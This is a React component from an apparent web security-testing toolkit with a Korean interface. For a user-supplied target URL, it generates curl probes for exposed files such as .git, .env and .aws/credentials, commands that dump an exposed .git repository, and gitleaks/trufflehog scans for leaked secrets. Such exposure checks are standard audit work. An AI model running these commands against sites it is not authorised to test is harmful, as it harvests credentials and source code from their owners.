import { useState } from 'react'
import { DISCLAIMER, Note, Readout, TextInput } from './shared'

export function GitSecretsExposureBuilder() {
  const [target, setTarget] = useState('')
  const base = (target.trim() || 'https://example.com').replace(/\/+$/, '')

  const paths = [
    '/.git/HEAD', '/.git/config', '/.git/index', '/.env', '/.env.local', '/.env.production',
    '/config.php.bak', '/wp-config.php.bak', '/.svn/entries', '/.DS_Store',
    '/backup.zip', '/dump.sql', '/.aws/credentials', '/docker-compose.yml', '/.vscode/sftp.json',
  ]
  const checkScript = paths.map(path => `curl -s -o /dev/null -w "%{http_code}\\t${path}\\n" "${base}${path}"`).join('\n')

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <TextInput label="대상 URL" value={target} onChange={setTarget} placeholder="https://example.com" />

      <div className="payload-readout-group">
        <strong className="payload-group-title">노출 경로 일괄 확인 (상태코드 조회)</strong>
        <Readout title="Bash 스크립트" value={checkScript} wrap="pre" />
        <Note>200이면 노출 확정, 403도 파일 존재를 암시하니 직접 확인하십시오. 404만 안전합니다.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">`.git` 디렉토리 전체 복원</strong>
        <Readout title="git-dumper" value={`git-dumper ${base}/.git/ ./dumped_repo`} wrap="anywhere" />
        <Readout title="GitTools (대안)" value={`git clone https://github.com/internetwache/GitTools.git && ./GitTools/Dumper/gitdumper.sh ${base}/.git/ ./dumped_repo`} wrap="anywhere" />
        <Note>.git/HEAD이 200으로 응답하면 웹서버가 .git을 그대로 서빙 중 — 전체 커밋 히스토리 복원이 가능합니다.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">복원된 저장소 시크릿 스캔</strong>
        <Readout title="gitleaks" value="gitleaks detect --source ./dumped_repo --report-path gitleaks-report.json" wrap="anywhere" />
        <Readout title="trufflehog" value="trufflehog filesystem ./dumped_repo --only-verified" wrap="anywhere" />
        <Note>git 히스토리에만 남아있고 현재 커밋에는 없는 키(과거에 커밋했다가 삭제한 비밀값)까지 스캔됩니다.</Note>
      </div>
    </div>
  )
}

export default GitSecretsExposureBuilder
